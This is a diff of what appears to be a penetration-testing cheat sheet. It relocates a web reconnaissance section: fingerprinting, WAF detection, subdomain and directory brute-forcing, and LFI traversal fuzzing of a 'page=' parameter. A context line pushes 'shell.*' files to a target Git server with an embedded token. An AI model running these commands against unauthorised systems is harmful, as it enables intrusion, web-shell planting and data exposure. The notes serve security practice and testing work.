@@ -79,37 +79,6 @@ cat dc-hosts pc-hosts > hosts
 ## Add domains to /etc/hosts
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
-## Web
-[*] Technology
-whatweb http://$TARGET
-
-[*] WAF
-wafw00f http://$TARGET
-
-[*] Subdomain
-gobuster vhost --append-domain -u $DOM -k -r -t 30 -q --exclude-length 282 \
--w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-| grep -oP '(?<=Found: )[^ ]+'
-
-[*] Directory
-dirsearch -u http://$TARGET -w /usr/share/wordlists/assetnote/directories.txt -x 400,403,404
-
-ffuf -u http://"$TARGET"/FUZZ -t 30 -rate 300 \
--e txt,pdf,conf,config,cnf,html,php,asp,aspx,js,bak,backup,log \
--v -recursion -recursion-depth 2 \
--fc 400,403,404 -fs 0 \
--w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
-2>/dev/null | grep -oP '(http.*)(?<!/)$'
-
-[*] Traversal
-ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
--w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-2>/dev/null | grep -oP '(http.*)(?<!/)$'
-
-[*] WordPress
-wpscan --url http://$TARGET/wordpress --enumerate
-Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
-
 # Exploitation
 ## Sorting files
 sort -u usernames | tee usernames
@@ -325,6 +294,36 @@ https://datafetcher.com/graphql-json-body-converter
 
 [*] Git
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
+
+[*] Technology
+whatweb http://$TARGET
+
+[*] WAF
+wafw00f http://$TARGET
+
+[*] Subdomain
+gobuster vhost --append-domain -u $DOM -k -r -t 30 -q --exclude-length 282 \
+-w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+| grep -oP '(?<=Found: )[^ ]+'
+
+[*] Directory
+dirsearch -u http://$TARGET -w /usr/share/wordlists/assetnote/directories.txt -x 400,403,404
+
+ffuf -u http://"$TARGET"/FUZZ -t 30 -rate 300 \
+-e txt,pdf,conf,config,cnf,html,php,asp,aspx,js,bak,backup,log \
+-v -recursion -recursion-depth 2 \
+-fc 400,403,404 -fs 0 \
+-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
+2>/dev/null | grep -oP '(http.*)(?<!/)$'
+
+[*] Traversal
+ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
+-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+2>/dev/null | grep -oP '(http.*)(?<!/)$'
+
+[*] WordPress
+wpscan --url http://$TARGET/wordpress --enumerate
+Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 ## Infrastructure
 [*] Cracking
